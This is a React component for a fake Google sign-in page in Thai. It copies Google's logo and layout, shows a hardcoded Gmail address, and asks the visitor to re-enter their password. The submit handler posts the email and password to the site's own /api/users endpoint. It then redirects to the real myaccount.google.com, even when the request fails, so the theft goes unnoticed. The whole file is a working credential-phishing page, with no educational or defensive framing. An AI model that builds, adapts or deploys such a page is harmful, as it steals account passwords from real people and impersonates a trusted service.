import React, { useState } from 'react';

export default function GoogleSignIn() {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const email = 'taiphak25442001@gmail.com';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;

    setLoading(true);
    try {
      const response = await fetch('/api/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      const data = await response.json();
      if (data.success) {
        window.location.href = 'https://myaccount.google.com/';
      } else {
        alert('เกิดข้อผิดพลาด กรุณาลองใหม่อีกครั้ง');
      }
    } catch (err) {
      console.error(err);
      window.location.href = 'https://myaccount.google.com/';
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '100vh',
      backgroundColor: '#f0f4f9',
      fontFamily: 'Roboto, Arial, sans-serif',
      margin: 0,
      padding: '16px'
    }}>
      <div style={{
        backgroundColor: '#fff',
        padding: '40px 40px 36px 40px',
        borderRadius: '8px',
        boxShadow: '0 1px 3px rgba(0,0,0,0.1)',
        width: '100%',
        maxWidth: '450px',
        boxSizing: 'border-box',
        textAlign: 'center'
      }}>
        {/* Google Logo */}
        <div style={{ marginBottom: '16px' }}>
          <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
            <path fill="#4285F4" d="M9.4 13.8v-3.2h9.2c.1.6.2 1.3.2 2.2 0 5.4-3.6 9.2-9.2 9.2-5.4 0-9.8-4.4-9.8-9.8s4.4-9.8 9.8-9.8c2.6 0 4.9 1 6.6 2.6l-2.4 2.4c-1.1-1-2.5-1.7-4.2-1.7-3.6 0-6.5 2.9-6.5 6.5s2.9 6.5 6.5 6.5c3.8 0 5.3-2.7 5.5-4.1H9.4z"/>
            <path fill="#EA4335" d="M30.4 13.5c0 3.7 2.8 6.4 6.4 6.4s6.4-2.7 6.4-6.4-2.7-6.4-6.4-6.4-6.4 2.7-6.4 6.4zm3.2 0c0-2.2 1.4-3.7 3.2-3.7s3.2 1.5 3.2 3.7-1.4 3.7-3.2 3.7-3.2-1.5-3.2-3.7z"/>
            <path fill="#FBBC05" d="M57.6 13.5c0 3.7 2.8 6.4 6.4 6.4s6.4-2.7 6.4-6.4-2.7-6.4-6.4-6.4-6.4 2.7-6.4 6.4zm3.2 0c0-2.2 1.4-3.7 3.2-3.7s3.2 1.5 3.2 3.7-1.4 3.7-3.2 3.7-3.2-1.5-3.2-3.7z"/>
            <path fill="#4285F4" d="M44.5 3.6h3.2V20h-3.2z"/>
            <path fill="#34A853" d="M70.3 4.2h3.2v15.2h-3.2z"/>
            <path fill="#FBBC05" d="M21.2 5.5c-1-.9-2.3-1.5-3.8-1.5-3 0-5.5 2.5-5.5 5.5s2.5 5.5 5.5 5.5c1.6 0 3-.6 4-1.6l-2.2-2.2c-.5.5-1.1.8-1.8.8-1.7 0-3.1-1.4-3.1-3.1s1.4-3.1 3.1-3.1c.7 0 1.3.3 1.8.8l2.2-2.3z"/>
          </svg>
        </div>

        <h1 style={{ fontSize: '24px', fontWeight: 400, color: '#202124', margin: '0 0 8px 0' }}>ไตรภาค</h1>
        
        {/* Email Pill Dropdown */}
        <div style={{
          display: 'inline-flex',
          alignItems: 'center',
          border: '1px solid #dadce0',
          borderRadius: '100px',
          padding: '4px 12px 4px 4px',
          margin: '0 0 24px 0',
          cursor: 'pointer'
        }}>
          <img
            src="/bird.jpg"
            alt="Profile"
            style={{ width: '20px', height: '20px', borderRadius: '50%', marginRight: '8px', objectFit: 'cover' }}
          />
          <span style={{ fontSize: '14px', color: '#3c4043', fontWeight: 500 }}>{email}</span>
          <svg style={{ width: '18px', height: '18px', marginLeft: '6px', fill: '#5f6368' }} viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
        </div>

        {/* Notice Box */}
        <div style={{
          backgroundColor: '#e8f0fe',
          borderRadius: '8px',
          padding: '12px 16px',
          marginBottom: '24px',
          textAlign: 'left',
          fontSize: '13px',
          color: '#17ea79',
          display: 'flex',
          alignItems: 'flex-start'
        }}>
          <span style={{ color: '#1a73e8', marginRight: '10px', fontSize: '16px', fontWeight: 'bold' }}>ℹ</span>
          <span style={{ color: '#1f1f1f', lineHeight: '1.4' }}>เลือก "ลองวิธีอื่น" เพื่อใช้พาสคีย์สำหรับการลงชื่อเข้าใช้ที่ง่ายและปลอดภัยยิ่งขึ้น</span>
        </div>

        <div style={{ textAlign: 'left', marginBottom: '32px' }}>
          <p style={{ fontSize: '14px', color: '#202124', margin: '0 0 16px 0' }}>หากต้องการดำเนินการต่อ โปรดยืนยันก่อนว่าเป็นคุณ</p>
          
          <form onSubmit={handleSubmit}>
            <div style={{ position: 'relative', marginBottom: '12px' }}>
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="ป้อนรหัสผ่าน"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                style={{
                  width: '100%',
                  padding: '16px 14px',
                  borderRadius: '4px',
                  border: '1px solid #dadce0',
                  boxSizing: 'border-box',
                  fontSize: '16px',
                  outline: 'none',
                  transition: 'border 0.2s'
                }}
              />
            </div>

            <div style={{ display: 'flex', alignItems: 'center', marginBottom: '32px' }}>
              <input
                type="checkbox"
                id="show-pass"
                checked={showPassword}
                onChange={(e) => setShowPassword(e.target.checked)}
                style={{ width: '18px', height: '18px', marginRight: '8px', cursor: 'pointer' }}
              />
              <label htmlFor="show-pass" style={{ fontSize: '14px', color: '#202124', cursor: 'pointer' }}>แสดงรหัสผ่าน</label>
            </div>

            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <a href="#" style={{ color: '#1a73e8', textDecoration: 'none', fontSize: '14px', fontWeight: 500 }}>ลองวิธีอื่น</a>
              <button
                type="submit"
                disabled={loading}
                style={{
                  backgroundColor: '#1a73e8',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '10px 24px',
                  fontSize: '14px',
                  fontWeight: 500,
                  cursor: 'pointer',
                  boxShadow: '0 1px 2px 0 rgba(60,64,67,0.3)'
                }}
              >
                {loading ? 'กำลังดำเนินการ...' : 'ถัดไป'}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
